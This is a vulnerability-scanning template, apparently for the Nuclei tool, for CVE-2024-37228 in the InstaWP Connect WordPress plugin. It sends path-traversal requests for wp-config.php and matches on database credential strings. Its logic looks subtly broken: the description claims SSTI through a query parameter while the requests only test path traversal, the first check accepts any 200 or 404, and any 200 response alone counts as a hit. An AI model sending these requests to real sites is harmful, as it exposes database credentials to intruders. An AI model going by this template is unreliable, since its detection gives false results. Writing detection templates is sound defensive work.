id: CVE-2024-37228

info:
  name: InstaWP Connect <= 0.1.0.38 - Server-Side Template Injection
  author: Chocapikk
  severity: critical
  description: |
    InstaWP Connect plugin versions up to and including 0.1.0.38 are vulnerable to Server-Side Template Injection (SSTI)
    via the file manager endpoint. The plugin does not properly validate the template_name parameter from the URL query var,
    allowing attackers to perform path traversal and include arbitrary PHP files leading to remote code execution.
  impact: |
    Unauthenticated attackers can inject and execute arbitrary PHP code on the server, leading to complete
    server compromise.
  remediation: |
    Upgrade to InstaWP Connect version 0.1.0.39 or later.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-37228
    - https://wiz.io/vulnerability-database/cve/cve-2024-37228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 10.0
    cve-id: CVE-2024-37228
    cwe-id: CWE-94
  metadata:
    verified: true
    max-request: 2
    vendor: wordpress
    product: instawp-connect
    framework: wordpress
    publicwww-query: "/wp-content/plugins/instawp-connect/"
  tags: cve,cve2024,rce,wp,wp-plugin,wordpress,ssti,template-injection,unauth,vuln

flow: http(1) && http(2)

variables:
  marker: "{{randstr}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/instawp-file-manager/{{randstr}}"
    matchers:
      - type: status
        status:
          - 200
          - 404
        condition: or

  - method: GET
    path:
      - "{{BaseURL}}/instawp-file-manager/../wp-config.php"
      - "{{BaseURL}}/instawp-file-manager/../../wp-config.php"
      - "{{BaseURL}}/instawp-file-manager/../../../wp-config.php"
      - "{{BaseURL}}/instawp-file-manager/../../../../wp-config.php"
    matchers:
      - type: word
        part: body
        words:
          - "DB_NAME"
          - "DB_USER"
          - "DB_PASSWORD"
          - "define('DB_"
          - "define(\"DB_"
        condition: or
      - type: status
        status:
          - 200

